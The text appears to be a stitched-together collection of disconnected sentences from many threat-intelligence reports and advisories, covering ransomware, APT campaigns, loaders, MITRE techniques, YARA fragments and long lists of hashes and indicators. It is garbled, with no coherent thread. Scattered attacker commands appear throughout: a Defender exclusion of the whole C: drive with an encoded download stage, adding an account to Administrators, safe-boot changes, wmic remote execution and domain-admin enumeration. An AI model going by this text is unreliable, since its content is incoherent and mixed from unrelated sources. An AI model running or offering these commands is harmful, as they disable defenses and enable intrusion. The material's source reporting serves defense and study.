The Crosswalk client uses KCP on top of a TCP connection: KCP protocol data is added to application-level messages that are then sent as TCP segments. 
Evaluate which administrative groups should administer which servers/workstations.
Finally, for defenders we can highlight two important elements from the intrusion and malware analysis presented here: Monitor for remote software activities such as AnyDesk for unauthorized use Always hunt and monitor for expired and/or leaked signing certificates as they can be used by threat actors to load and execute malware Threat detection 
On other desktop environments , it appends the same script to the ~/.profile file. 
Platform Hardening Software Update [D3-SU] Detect: File Analysis
Figure 1.
AS54290 offerings.cloud perseus.bond docs.azure-protection.cloud avid.lno-prima.lol 152.89.247.87 combahton GmbH AS30823 offerings.cloud 172.86.121.130 HIVELOCITY AS29802 www.capmarketreport.com 149.28.247.34 The Constant Company, LLC AS20473 ms.msteam.biz www.onlinecloud.cloud 155.138.159.45 The Constant Company, LLC AS20473 The actor usually used fake domains such as cloud hosting services for hosting malicious documents or payloads.
main module – performs the main functionality of the malware.
Subsequent messages are exchanged in the original TCP connection (without TLS encryption).
:library /utf8output /R:'System.dll' /R:'C:\windows\Microso 
TA0004 Privilege Escalation T1068.
Operation Tainted Love  Chinese APTs Target Telcos in New Attacks
Figure 3.
A Sophisticated Financial Threat | Mandiant Get updates from Palo Alto Networks! Sign up to receive the latest news, cyber threat intelligence and research from us 
The configuration shown comes from the loader installed by the dropper sample with SHA-1 hash 9f8530627a8ad38f47102f626dec9f0173b44cd5.
[WINDOWS-CLIPBOARD] rundll32 command with DllRegisterServer 5008372 
Figure 2 – Spam email containing malicious doc attachment 
= "" ] && kill -9 "$I2PD_PID" >
If you think you may have been compromised or have an urgent matter, get in touch with the Unit 42 Incident Response team or call North America Toll-Free: 866.486.4842 (866.4.UNIT42), EMEA: +31.20.299.3130, APAC: +65.6983.8730, or Japan: +81.50.1790.0200. Palo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance members.
CrowdStrike was able to reconstruct the PowerShell script from the PowerShell Operational event log as the script’s execution was logged automatically due to the use of specific keywords.
Win 32.CCPASS HackTool.
As per the Verizon DBIR report 2020, over 80% of data breaches involve credential theft attacks.
北京华林保软件技术有限公司 Indicator Removal The threat actor was observed deleting files that had been dropped to disk. 
Otherwise, it continues sending shellcodes. 
Process Injection: Process Hollowing T1055.012 TrickBot injects into the svchost.exe process. 
In both cases, the affected organizations had files encrypted with the “.akira” extensions and had nearly identical ransom note files, named fn.txt, dropped in the process (as shown below in Figure 1]. Figure 1: “fn.txt” ransomware notice This Akira ransomware bears no code similarity to a previous ransomware strain with the same name that was active in 2017 and is likely unrelated.
The function in the embedded DLL that decrypts the payload is the same as the function used in FatalRAT to decrypt its configuration.
This wraps up our triage of the locker_Apple_M1_64 binary.
Victims are not targeted geographically but simply identified by their internet accessibility. 
This blog entry discusses in depth the findings from our investigation of samples of this new piece of ransomware, as well as the tools that Royal ransomware actors used to carry out their attacks. 
The path partially overlaps with the PDB path of a Mimikatz Soft Cell executable (E:\vs_proj\simplify_modify\Win32\simplify.pdb) and another Mimikatz executable of a Chinese threat actor thought to be part of the Soft Cell activity group arsenal (E:\vs_proj\mimkTools\dcsync_new\x64\dcsync64.pdb).
Employ strong multi-factor authentication for personal accounts, if available. 
[T1211] Signed Binary Proxy Execution: Compiled HTML File [T1218.001] Signed Binary Proxy Execution:
After obtaining initial access, they usually drop web shell and gain local administrator access on the infected machine.
Payload file with the config to communicate with Command & Control Server (C2). 
During Phase I, the red team attempts to gain and maintain persistent access to an organization’s enterprise network while avoiding detection and evading defenses.
Windows users in 38[.]54[.]33[.]228 While hunting samples related to this campaign, we came across a tweet about Cobalt Strike posted in April 2021.
It should be noted that these techniques are basic examples and represent fundamental practices in the field of malware development and sandbox detection. 
Taking a close look at OneNote document gives us an interesting observation as its magic bytes for the header is not a trivial one.
Naturally, this growing trend in the crypto space has opened up a new vector for threat actors to exploit. 
At first glance it it appears that there is a ‘Open’ button embedded within the document.
Nothing forces alternative implementations of the Pedersen Hash to follow the exact same encoding rules, though in practice many do.
Manual interactions are required up until the files inside the zip file are extracted, and the link file is manually run.
2>$temp\TS_P34H.tmp" $temp\TS_P61S.tmp -accepteula -d -s \\<redacted_internal_ip3>\ cmd /c "ping -n 2 -a <redacted_internal_ip2>>$temp\TS_P34H.tmp" Usage of WMI for remote command execution: wmic /node:<redacted_internal_ip1> /user:<redacted_group>\<redacted_user>
Domain Policy Modification:
POTENTIAL COBALT STRIKE INSTALLATION - TOX5.EXE Initial static review of the tox5 sample did not reveal much information, indicators show that this may have the ability to clear event logs. 
Ingress Tool Transfer [T1105] Endpoint Protection Platform Endpoint Detection and Response Detect and identify source IP and source process of malicious traffic Investigate destination IP address Triage compromised host Develop response plan Malicious file was removed by antivirus Ransomware Simulation Execute simulated ransomware on multiple Workstation systems to simulate a ransomware attack. 
We continue to investigate this threat using our Threat Intelligence and we will add additional detection logic once they are available. 
Remote Access Software Black Basta has installed and used legitimate tools such as TeamViewer and AnyConnect on targeted systems. T1573.
Learn More You can find the latest content about security analytic stories on GitHub and in Splunkbase.
➝ net group "Domain Admins" /domain 
Even if they manage to pass all the checks of the Pre-Validator, the C2 server operator may refuse to infect a suspicious machine. 
S1037 STARWHALE
These countries signed these agreements intending to normalize diplomatic relations in the region.
Now, it becomes clear why IronPython is also attractive for malware authors.
Service Name: AnyDesk ServiceService File Name: "C:\Program Files (x86)\AnyDesk\AnyDesk.exe" --serviceService
If the decryption leads to a valid URL, the malware initiates a download, which delivers an executable.
This user right allows non-administrative users to create global objects, including services.
Continue running the program until VirtualAlloc is called with the size: 0x17400 – which is even bigger than the previously allocated buffer.
With no active defenses (Antivirus or Endpoint Protection) the system comes up and tries to start its defined shell which has been swapped to a batch script (file2.bat) by the malicious actor.
Breakpoint 0 hit coop!main+0x3d2: 00000001`4001847e ff159cbb0a00 call qword ptr [coop!__guard_dispatch_icall_fptr (00000001`400c4020)] ds:00000001`400c4020={ntdll!LdrpDispatchUserCallTarget (00007ffb`ecbdc620)} 0:000>t ntdll!LdrpDispatchUserCallTarget: 
Once the for loop completes, the Fantasy wiper creates a batch file in %WINDOWS%\Temp called registry.bat.
Possibly the initial NetWalker operators added a RaaS operation, while continuing to cause NetWalker infections themselves. 
At this point, the threat actors had the clear text credentials for one of the domain administrator accounts and began moving lateral to other systems.
A decompilation of this ping function is shown in Figure 4. Figure 4.
Create or Modify System Process:
Create an empty directory %
R580958
C:\ProgramData\lmapi2.dll /ve /f /reg:64 && rundll32.exe
Hex net use \\%%i\c$ /del )ELSE ( echo not access %%
5.r = recurse subfolders.inul
This malware tries to track logged in WordPress users to avoid injections — even when they log out of WordPress.
In the case of Sophos, it’s critical for customers to have their CryptoGuard policy activated, which is something support can guide customers on.
More recently, legitimate and penetration testing tools for the cloud have been used by threat actors.
It avoids collecting documents with file names starting with “$” or “~” since these types of documents are usually either temporary files generated by the system or PE files pretending to be decoy documents (as we discussed in the arrival vectors section). 
The below figure illustrates the sequence of commands executed by the NoEscape ransomware to delete shadow copies and system backups. 
The activity was initially identified by eSentire MDR for Network via our global IP address blocklist.
A solution such as CrowdStrike Falcon:registered: Identity Threat Detection would help identify these anomalous logons — and especially infrequent destinations for accounts.
The Data field may contain RC4-encrypted, Base64-encoded command data or be empty.
These records don’t need to be updated regularly.
File infectors usually call their malicious code very early (e.g., by replacing an early call instruction to their malicious code, or by overwriting the entry point in the PE header) before any function calls from external libraries are ever called.
Despite its size, the only functionality of the Initial Loader is to decrypt and launch the 32-bit Trojan Loader. 
The OLE object is then saved with a “.tmp” file extension into one of the local temp folders under “C:\Users\[username]\AppData\Local\Temp”.
Like Drokbk, Soldier C2 infrastructure is stored on a domain rotator on a GitHub repository operated by Mint Sandstorm.
Use an authentication, authorization, and accounting (AAA) systems to limit actions administrators can perform and provide a history of user actions to detect unauthorized use and abuse. 
C:\WINDOWS\system32\net1 localgroup Administrators <REDACTED> /add bcdedit /set {default} safeboot minimal reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v
However, the threat actor could have easily used a second domain administrator account or any other combination of accounts that would not be easily detected.
It also uses similar techniques as Brazilian banking trojans reported by other security researchers at ESET and Check Point in the past.
Figure 15: Contents of CollectMirror.ps1 Figure 16: Contents of TestMouse registry value The script performs process injection using the API such as OpenThread (to create a handle to an existing process), VirtualAlloc (memory allocation in the chosen process), and QueueUserAPC, the thread that the APC (Asynchronous Procedure Calls) is queued to has to enter an alertable state, this can be achieved by invoking SleepEx as shown in Figure 17. 
It also contains environment checking and Anti-VM functions.
This access was used to perform enumeration and move laterally to other hosts. 
Please send us your feedback by emailing us at research@eclecticiq.com. 
We also noted that this update includes a more sophisticated encryption method of byte remapping and a monthly change in command-and- control (C&C) server.
Hacking Tools Besides the shellcode loader and Cobalt Strike, we also observed additional tools, including port scanner, proxy and information stealer deployed to the compromised hosts.
pic.twitter.com/gH3uCpVMpB— (づ｡◕‿‿◕｡)づ (@Glacius_)
An example of the first debug message There are two C&C servers that were used in this attack chain.
PROGRAMDATA%\Progptp (although we observed some cases where the FatalRAT malware was installed in this directory instead). 
/C dir \\[REDACTED HOST]\c$\users >> listing.txt 
Coupled with the fact that this may be, (as noted by @VXUnderground), “the first time a large ransomware threat group has developed a payload for Apple products” …I was intrigued to decided to dig right in! 
It is possible that the attackers are solely interested in the theft of information like web credentials to sell them on underground forums or to use them for another type of crimeware campaign, but for now specific attribution of this campaign to a known or new threat actor is not possible. 
b374k login site Conclusion SentinelLabs remains actively engaged in monitoring the activities conducted by Kimsuky.
The total amount of bitcoin extorted this way between 1 March 2020 and 27 July 2020 is 677 BTC.
This effectively ransoms all systems in a victim’s environment with a single execution of HIVE—when performed by a privileged user such as a Domain or Enterprise Admin account.
-ne
Malicious OneNote attachment used in recent campaign (Proofpoint) 
Conveniently, the open source tool Wireshark/Tshark accepts a keyfile to perform this decryption automatically on collected pcap traffic. 
The last hook in the chain creates a thread in the kernel that injects the next stage into winlogon.exe. 
FY 2022 Q2 is not included due to lack of sufficient information. 
Meanwhile, they developed customized toolsets designed to collect confidential documents in the exfiltration stage. 
The Winnti malware is known to be used by several actors.
As it is evident from the image the data represents a text file which is a script to launch PowerShell. 
Encrypts both local and network files.
Starting in February 2023, Proofpoint observed the new Forked variant of IcedID.
One of the first observed malicious usage of OAuth applications in the wild is consent phishing.
According to extracted metadata, attackers worked on the preparation of the campaign between January and February 2022.
is_audio_only: false id_prefix: "1202"} Figure 12.
021B9E2E8AA30B29569254C0378A9F43E4F32EECwinver64.dllWin64/Agent.
The Tor page was not the only noticeable change we will highlight in this blog. 
Store passwords in hashed format using industry-recognized password managers. 
To identify if privileged users are active on remote servers, the adversary makes use of PsLogList from Microsoft Sysinternals to retrieve the Security event logs.
Intezer’s automated alert triage and response process collects files from your endpoint security solution (like CrowdStrike, Microsoft Defender, or SentinelOne) to identify packed files, extract the payload, and then respond autonomously or with the results Intezer provides for remediation. 
Unlike the typical bitwise operations from typical decryption routines, ViperSoftX uses byte remapping to ensure that the shellcode cannot be easily decrypted without the correct byte map, weaving a cross-stitch template to the palette of 256 (0x100h) bytes.
Win32.CCPASS is another tool that is also used for Windows 10 UAC bypass and similarly reuses codes from the function ucmMsStoreProtocolMethod in the project UACME. 
This serves to further legitimize the package in the eyes of the victim and draw attention away from the malicious binary. Figure 3.
Overwriting all files with 64 KB chunks of random data with one thread. 
The sbmsa[.]wiki domain was also created on Feb. 9, 2023, which was found to be used by the second stage of the MacOS version.
Our sandbox environments are constrained in resources like disk space, and the number of DLL files in the world is seemingly infinite. 
The developers of the antivirus position their solution as a “second-layer antivirus” with “active users mostly from Indonesia, and other users mostly come from Southeast Asia and Africa Countries”.
D81215890703C48B8EA07A1F50FEC1A6CA9DF88BN/AWin32/TrojanDownloader.
Install, regularly update, and enable real time detection for antivirus software on all hosts. 
[4] “L-codes/Neo-reGeorg: Neo-reGeorg is a project that seeks to aggressively refactor reGeorg.”
Defense EvasionT1140Deobfuscate/Decode Files or InformationThe attackers have used various encryption algorithms in their droppers to hide strings and payloads. 
These decoy machines should be joined to the decoy AD and configured with deceptive user accounts to monitor successful logon attempts to the systems. 
Some of these websites look identical to their legitimate counterparts but deliver malicious installers instead.
Zerobot (Win32/64 and Linux) SparkRat (Win32/64 and Linux) 
C:\ProgramData\lmapi2.dll,#1 The DLL file lmapi2.dll is a 64-bit PE file with the compiler timestamp Mon Jan 17 08:10:01 2022 | UTC.
Even though the Properties sheet won’t display the Powershell command, if the file is a Shortcut it will have a Shortcut tab (normal document files won’t have those) and it accurately shows that the “Target type” is a Visual Basic Script (VBScript Script File).
Some variants used a known UAC bypass method abusing the legitimate fodhelper.exe (3.1).
.m3u .m4a .m4v .max .mdb 
Fortunately, however, even as the threat level for cryptocurrency users rises, we also know that Morphisec’s Moving Target Defense technology is capable of both seeing and stopping Babadeda. 
About The Author Matteo Malvica Content Developer Matteo Malvica is a content developer at Offensive Security focusing on vulnerability research, exploit development, reverse engineering and operating system internals. 
0x14 File body bytes. 
i=bypassed recovery failedcan't scan our own stackcertificate unobtainablechacha20" ascii condition: uint16(0) == 0x5a4d and filesize < 14000KB and 1 of ($x*) } rule dontsleep { meta: description = "15184_ - file dontsleep.exe" author = "The DFIR Report" reference = "https://thedfirreport.com" date = "2022-11-28" hash1 = "f8cff7082a936912baf2124d42ed82403c75c87cb160553a7df862f8d81809ee" strings: $s1 = "shell32.dll,Control_RunDLL" fullword ascii $s2 = "powrprof.
['S-1-5-18’ ‘<Redacted>$' ' Redacted>' '0x00000000000003e7' 'Security' 'Process' '\Device\HarddiskVolume3\Windows\System32\lsass.exe' '0x0000000000000524' '{00000000-0000-0000-0000-000000000000}' '%%
Modify Registry Black Basta makes modifications to the Registry. 
When someone tries to double-click these decoy files, Windows (or the application mapped to the relevant filetype) throws an error because the file isn’t the type of file it appears to be.
Impact Data Encrypted (T1486): NetWalker Ransomware Inhibit System Recovery (T1490): Shadow Copies Deleted Service Stop (T1489) Conclusion Ransomware has evolved into a lucrative business for threat actors, from underground forums selling ransomware, to offering services such as support portals to guide victims through acquiring crypto currency for payment, to the negotiation of the ransom.
=C:\ESD\sharez.txt dllhost32.exe -n=1 -s
= "true" ]; do curl --silent -o "$d_md5" "http://127.0.0.1:4445/$MD5"; [ -f "$d_md5" ] && finished="true" && md2=$(cat "$d_md5") && rm -rf "$d_md5"; sleep 5; (pgrep -x 'Activity Monitor' > /dev/null) && ([ "$I2PD_PID" !
The Azure AD Connector account and the compromised administrator account were then used to perform significant destruction of the Azure environment—deleting within a few hours server farms, virtual machines, storage accounts, and virtual networks.
FBI has observed Royal actors using remote monitoring and management (RMM) software, such as AnyDesk, LogMeIn, and Atera, for persistence in the victim’s network
PowerShell Black Basta has encoded PowerShell scripts to download additional scripts. 
Settings.
Additionally, the overlaps among victims indicate a lack in targeting coordination and/or planning within the overall groups' leadership or management. 
G1022 ToddyCat
Then the script downloads the contents of an HTML file stored in an attacker-controlled server and writes it to the HTML file dropped in the “fb” folder.
G0032 Lazarus Group
Scheduled Task T1059: Command and Scripting Interpreter T1059.003:
Figure 16.
To achieve this task, it employs similar techniques as those used in the first stage — the only difference, in this case, is that the malware is executing a .NET Assembly from C++ in memory using the CLR (Common Language Runtime) hosting technique. 
Step 3, another shellcode, XOR-decrypts an embedded PE file – the Dolphin backdoor – and loads and executes it using a custom PE loader. 
Storing the ransomware within a 7zip encrypted archive (int.7z) with a password even as simple as (123) makes the task of identifying the ransomware on disk or transmitted across the network nearly impossible.
(0722)상임위원회 및 상설특별위원회 위원 명단(최종).zip 
The tool was used by the adversary on various systems to write events from the Windows Security Event Log to a text file.
After allocating the virtual memory and setting the page permissions to Read-Write-Execute, a decryption routine is executed that decrypts the remaining malicious code in the .kxrt section and writes it to the virtual memory. 
Most likely there should be a period before .dat.
We also observed the context around that batch file in our telemetry.
However, it is important to note that the site seems to be owned by a legitimate venture capital group, which may indicate a compromise of their organization or that the email account was spoofed.
693a4c2fcaa67fb87e62f150fb65e00e 6ad33ab8b9ff3f02964a8aab2a40ebb5 6b540be7ac7159104b0ffa536747f1bf 6b7276e4aa7a1e50735d2f6923b40de4 6b930be55ed4bf8e16b30eadc3873dfd 6c67f275d50f6bfee4848de6d4911931 6c9cfada134ede220b75087c7698ebf2 6e843ef4856336fe3ef4ed27a4c792b1 6e97bf1b7c44edc66622b43e81105779 86e50d6dc28283dbd295079252787577 870fbad5b9a54cb6720c122d1fa321ec 88b3b94574ba1eeb711a66eb04021eed 8956a045306b672d3cc852419a72c4b0 8a9ac1b3ef2bf63c2ddfadbbbfd456b5 8b3b96327fbddebefe727ac2edad5714 8baa499b3e2f081ff47f8cf06a5e7809 8bc20fcd09adb7ea86dda2c57477633b 8be0c21b6ee56d0f68e0d90f7d0a26d7 8c80dd97c37525927c1e549cb59bcbf3 8d2416d9f6926fb0dc12ab5dafef691d 8d74922b2b31354ce588cefac71d9a9b 8e8fb7632c3a7e96cf0ea5299d564018 8ee6c9e1adb71b2623d5e7aa45df5f4d 8efaa987959ef95179a0f5be05c10faf 8fbf53f77c98daba277dae7661b86f02 8fc825df73977eeffaaa1587565f7505 90a3e3a2049c6eb9e39d113d9451a83f 932d355d9f2df2e8d8449d85454fc983 9450980a4413dfdbc60a62b257a7b019 947892152b8419a2dfe498be5063c1da 94d42ff06a588587131c2cd8a9b2fe96 95c15b7961e2d6fad96defa7ff2c6272 96ba4bf00d8b4acee9f550286610dcc7 97004f1962e2aed917dc2be5c908278f 972077c1bb73ca78b7cad4ac6d56c669 991ebcd03ace627093acc860fae739b5 99949240bc4eae33cac4bbb93b72349d 9a0a8048d53dedc763992fff32584741 9a0e3e80cd7c21812de81224f646715e 9a61ed5721cf4586abd1d49e0da55350 9b26999182ea0c2b2cac91919697289e 9c656ce22c93ca31c81ff8378a0a91ee ace620a0cc2684347e372f7e40e245d5 ad3b9e45192ec7c8085c3588cacb9c58 adb4f6ecb67732b7567486f0cee6e525 afa03ddb9fc64a795aadb6516c3bc268 b0269263ce024fc9de19f8f30bd51188 b04e895827c24070eb7082611ab79676 b059c9946ff67c62c074d6d15f356f6e b07299a907a4732d14da32b417c08af3 b1dadfcf459f8447b9ec44d8767da36d b2f1d2fefe9287f3261223b4b8219d03 b36f3e12cb88499f8795b8740ae67057 b4204f08c1a29fd4434e28b6219bfbc6 b4878c233d7f776a407f55a27b5effbc b6c12d88eeb910784d75a5e4df954001 b7ab5c6926f738dbe8d3a05cb4a1b4f5 b80dcd50e27b85d9a44fc4f55ff0a728 b8a61b1fda80f95a7dcdb0137bc89f67 b9642c1b3dbcccc9d84371b3163d43e0 b9647f389978f588d977ef6ef863938f b977bed98ae869a9bb9bf725215ef8e5 b9b627c470de997c01fdef4511029219 ba629216db6cf7c0c720054b0c9a13f3 badf0957c668d9f186fb218485d0d0f6 bb165b815e09fe95fa9282bce850528d bbfb478770a911cf055b8dfd8dcb36e4 bc4c189e590053d2cf97569c495c9610 bc9089c39bcdb1c3ef2e5bd25c77ed68 bd42303e7c38486df2899b0ccf3ce8f7 bd452dc2f9490a44bcff8478d875af4b bd6031dd85a578edf0bf1560caf36e02 bd63832e090819ea531d1a030fb04e9b be39ff1ec88a1429939c411113b26c02 be88741844bf7c47f81271270abe82dc ce26e91fc13ccb1be4b6bf6f55165410 ce449d7cb0a11b53b0513dde3bd57b1c ceba742bccb23304cf05d6c565dc53f8 cebe44b8a9a2d6e15a03d40d9e98e0ed cf946bc0faecb2dc8e8edc9e6ce2858f d09fcd9fa9ed43c9f28bcd4bd4487d22 d0b5c11ee5df0d78bdde3fdc45eaf21d d0d8243943053256bc1196e45fbf92d2 d0efc042ba4a6b207cf8f5b6760799d8 d20d01038e6ea10a9dcc72a88db5e048 d31596fe58ca278be1bb46e2a0203b34 d3df8c426572a85f3afa46e4cd2b66cd d59a77a8da7bec1f4bad7054a41b3232 d76b1c624e9227131a2791957955dddc d79477c9c688a8623930f4235c7228f6 d8a483d21504e73f0ba4b30bc01125d3 da46994fee26782605842005aabcd2fe daa232882b74d60443dfec8742401808 dab45ac39e34cfee60dcb005c3d5a668 dbc583d6d5ec8f7f0c702b209af975e2 dbe92b105f474efc4a0540673da0eb9c dbee8be5265a9879b61853cd9c0e4759 dc15ca49b39d1d17b22ec7580d32d905 dc386102060f7df285e9498f320f10e0 dd43cd0eddbb6f7cb69b1f469c37ec35 dd4e0f997e0b2cc9df28dca63ded6816 ddbdc6a3801906de598531b5b2dac02a dde4ff4e41f86426051f15da48667f5f ddecce92a712327c4068fabf0e1a7ff1 de608439f2bcc097b001d352b427bb68 deeb9b4789ac002aa8b834da76e70d74 df6475642f1fe122df3d7292217f1cff e011784958e7a00ec99b8f2320e92bf4 ec4cdc752c2ecd0d9f97491cc646a269 edb648f6c3c2431b5b6788037c1cd8ef ee3e297abd0a5b943dce46f33f3d56fb ee4862bc4916fc22f219e1120bea734a ef14448bf97f49a2322d4c79e64bb60b ef2738889e9d041826d5c938a256bc45 ef6fcdd1b55adf8ad6bcdf3d93fd109e efb5499492f08c1f10fecdeb703514d5 f0098aab593b65d980061a2df3a35c21 f073de9c169c8fcb2de5b811bff51cee f0881d5a7f75389deba3eff3f4df09ac f172ad4e906d97ed8f071896fc6789dc f2b6bffa2c22420c0b1c848b673055ed f446d8808a14649bddcc412f9e754890 f4dbe32f3505bc17364e2b125f8dd6df f4dd628f6c0bc2472d29c796ee38bf46 f4e67343e13c37449ada7335b9c53dd1 f53e332b0a6dbe8d8d3177e93b70cb1e f5ae03de0ad60f5b17b82f2cd68402fe f5ce889a1fa751b8fd726994cdb8f97e f5fdbfce1a5d2c000c266f4cd180a78d f7202dea71cc638e0c2dbeb92c2ce279 f7cef381c4ee3704fc8216f00f87552a f7ffbbbc68aadcbfbace55c58b6da0a7 f8b91554d221fe8ef4a4040e9516f919 f906571d719828f0f4b6212fc2aa7705 f9155052a43832061357c23de873ff9f f9abacc459e5d50d8582e8c660752c4e f9f608407d551f49d632bd6bd5bd7a56 f9fc9359dc5d1d0ac754b12efb795f79 fa27742b87747e64c8cb0d54aa70ef98 fa3c8d91ef4a8b245033ddb9aa3054a2 fad93907d5587eb9e0d8ebc78a5e19c2 Contact Information To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact your local FBI field office at www.fbi.gov/contact-us/field, or the FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by email at CyWatch@fbi.gov.
Additional Files and commands observed transferred detected via clipboard logging: 
However, unlike ABPASS, it hijacks the ms-windows-store protocol.
Figure 14: BAT (.bat) file displayed in a text editor. 
Cloud Infrastructure Discovery T1580 The team found SecOps network diagrams on a host detailing cloud infrastructure boundaries. 
Impact Spam Email During the first two days, Emotet sent outbound spam emails over SMTP: 
Microsoft uses DEV-#### designations as a temporary name given to an unknown, emerging, or a developing cluster of threat activity, allowing Microsoft to track it as a unique set of information until we reach high confidence about the origin or identity of the actor behind the activity. 
This means if downloaded to a macOS system (i.e. deployed by the attackers) macOS won’t let it run.
During encryption, Ransom Cartel specifically seeks out files with the following file extensions: .log, .vmdk, .vmem, .vswp and .vmsn.
LockBit Ransomware: After the LockBit ransomware successfully executes on a system, it initiates a series of actions.
The malware combines several open-source projects to improve its capabilities.
T1562.003Impair Defenses: Impair Command History LoggingOdicLoader modifies the victim’s Bash profile, so the output and error messages from SimplexTea are muted.
The malware expects to find specific entries which match our analysis of the installer. 
CaptureFlowCloud takes screenshots at regular intervals. 
CobaltStrike-9909816-0 Open Source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org. IOCs Hashes 658d550322cefa6efc51fbfd1a3e02839d1e519a20f8f17f01c534c0eaf36f27 e806e55713b9e46dc7896521ffb9a8b3abaa597147ea387ff2e93a2469546ba9 a0aec3e9cb3572a71c59144e9088d190b4978056c5c72d07cb458480213f2964 Network IOCs Hosts test[.]softlemon[.]net dark-forest-002.president[.]workers[.]dev IP addresses 193[.]135[.]134[.]124 URLs hxxp://test[.]softlemon[.]net:8081/api/3 hxxp://test[.]softlemon[.]net/ tcp://test[.]softlemon[.]net:8080/ hxxps://193[.]135[.]134[.]124:8443 hxxp://193[.]135[.]134[.]124:8080 hxxp://193[.]135[.]134[.]124:8081 
Permission Groups Discovery T1069 TrickBot can identify the groups the user on a compromised host belongs to. 
WinRing0x64.sys – XMRig Miner driver wuacltservice.exe – XMRig Miner config.json – XMRig miner configuration RuntimeBroker.exe – Associated file.
It is a note-taking app that allows collaboration across organizations while enabling users to embed files and other artifacts.
Server parameters: url – list of prefixes on which it will run and timeout – client timeout. 
%= 256 xxZmgLbpuJ
A unique certificate retrieved from multiple ScrambleCross C2 servers in the campaign described in this report was sent as a response in a few other dozen servers in the wild, a few of them have been previously reported by the FBI as being part of an APT41-owned infrastructure. 
title: Enigma Stealer Targets Cryptocurrency Industry with Fake Jobs url: https://www.trendmicro.com/en_us/research/23/b/enigma-stealer-targets-cryptocurrency-industry-with-fake-jobs.html Malware Enigma Stealer Targets Cryptocurrency Industry with Fake Jobs We discovered an active campaign targeting Eastern Europeans in the cryptocurrency industry using fake job lures. 
It includes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks. 
The adversaries made use of techniques very often observed in this kind of attack but also used distinctive new backdoors or variants of existing malware families.
Victim timeline and locations 
Within it, the Loader overwrites the current PE with the final payload’s PE.
T1560.002Archive Collected Data: Archive via LibraryUsing the Zipper library, Dolphin compresses and encrypts collected data before exfiltration. 
Table 11: Command and control techniques observed by CISA MITRE ID Name Observation T1090.002 Proxy: External Proxy CISA observed activity from a network proxy tool to 221 unique Federal Government agency IP addresses. 
POST-EXPLOITATION TECHNIQUES, TACTICS, AND PROCEDURES COMMAND AND CONTROL Initial Command and Control was initially conducted from "23.19.58.43"[zedorocop[.]com] and "23.106.160.141" [danimos[.]com].
Figure 12.
The malware injects the ProcessWorm into all processes running on the system.
The encryption/decryption function, shown in Figure 20, always uses the same key. Figure 20.
They pivoted to a couple of workstations on the network using Cobalt Strike and installed Atera and Splashtop with a different MSI installer.
However, both URLs used by attackers appared active even recently (Q3 2022).
Based on how GameuxInstallHelper.dll is launched, we quickly can guess that this file, too, is an executable file compiled with .NET.
Exploring advanced exfiltration techniques, enabling the covert transfer of sensitive data from target environments. 
Vice Society first surfaced in the summer of 2021, and in that time frame it was seen exploiting the CVE-2021-34527 (aka PrintNightmare) vulnerability as part of their attack chain.
Linux is a registered trademark of Linus Torvalds.
These intrusions exploited the Microsoft SharePoint vulnerability CVE-2019-0604 to install web shells and FOCUSFJORD payloads at targets in the Middle East and Central Asia.
The called function is not explicitly exported. 
All these inspections are carried out to avoid exposing the malicious functionality to unwanted environments, such as test networks or machines belonging to SolarWinds. 
Sample contents of the \efi\microsoft\boot\en-us\ directory Once the original bootloader is located, it is loaded into memory, patched and launched.
Companies operating in the accounting, construction, engineering, and investment sectors are thought to have been particularly targeted by the botnet.
S0543 Spark
title: LockBit Ransomware 2.0 Resurfaces url: https://blog.cyble.com/2023/06/06/lockbit-ransomware-2-0-resurfaces/ Threat Actor Targeting Korean Users through malicious Document Files Cyble Research and Intelligence Labs (CRIL) recently discovered an ongoing campaign associated with the notorious ransomware group LockBit. 
Figure 26.
S0121 Lslsass
The following SIDs have been released to detect this threat: 57876, 57877.Indicators of Compromise (IOCs)The following IOCs have been observed being associated with the attack.
[T1562.001]: powershell try{Add-MpPreference -ExclusionPath 'C:\'; Write-Host 'added-exclusion'} catch {Write-Host 'adding-exclusion-failed' }; powershell -enc "$BASE64 encoded payload to download next stage and execute it" The exclusion rule allowlisted the entire , enabling threat actors to download tools to the without virus scans.
Conclusion As we have seen in the examples above, the main objective of the attackers behind wipers is to destroy all possible data and render systems unbootable (if possible), potentially requiring a full system restore if backups aren’t available.
We will go into detail for each of them. 
The call to kernel32.CreateMutexA can be seen in Figure 13. Figure 13: Mutex Creation Interestingly, BazarLoader will check for mutexes twice. 
Before a call to CreateWindowEx, you would usually first need to create a class by calling RegisterClass and then class CreateWindowEx.
Network requirements vary across different NetSupport Manager configurations and sessions.
-k -p
an opened WebDAV folder As it can be seen in the screenshot, the URL changes a bit. 
We’ve also included the corresponding offset and size to provide a better visual reference of the data structure used by the malware, and to easily cross-reference each field of interest. 
Regularly evaluate and update blocklists and allowlists. 
CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors.
More details on the Content Hub can be found here: https://learn.microsoft.com/azure/sentinel/sentinel-solutions-deploy 
If this value is anything other than 0, the ransomware will proceed to spawn another instance of itself via rundll32.exe, specifying the Rathbuige export. 
CloseConnectionGroup("") } $req.
The icon, which doesn’t resemble the icon used by any known PDF reader application, looks like an icon for a plain text document wrapped in a red bar with the white letters PDF inside. 
These indicators should not be considered exhaustive for this observed activity. 
Response when accessing the C&C via web browsers (top), and modifying the user-agent to access the C&C and return encoded data (bottom) 
S0247 NavRAT
The NSA Cyber Windows Event Monitoring Guidance, has the following statement: Application crashes may warrant investigation to determine if the crash is malicious or benign. 
Meet ScarCruft’s Dolphin url: https://www.welivesecurity.com/2022/11/30/whos-swimming-south-korean-waters-meet-scarcrufts-dolphin/ ESET researchers uncover Dolphin, a sophisticated backdoor extending the arsenal of the ScarCruft APT group ESET researchers have analyzed a previously unreported backdoor used by the ScarCruft APT group.
To do so, they first interfered with security tools using Group Policy Objects (GPO).
This blog post was authored by hasherezade NSIS (Nullsoft Scriptable Install System) is a framework dedicated to creating software installers.
When a new FOCUSFJORD sample is first executed and writes its configuration to registry, this value is set to “default” and is later manually changed by the actor, usually to the victim’s domain name or organization name.
T1083File and Directory DiscoveryFlowCloud can search through connected file systems and obtain directory listings. 
DarkComet then allows for threat actors to obtain logs of the infected machine’s keystrokes, application use, and take screenshots, amongst other things. 
...doing it's thing! 
These operations are done by. 
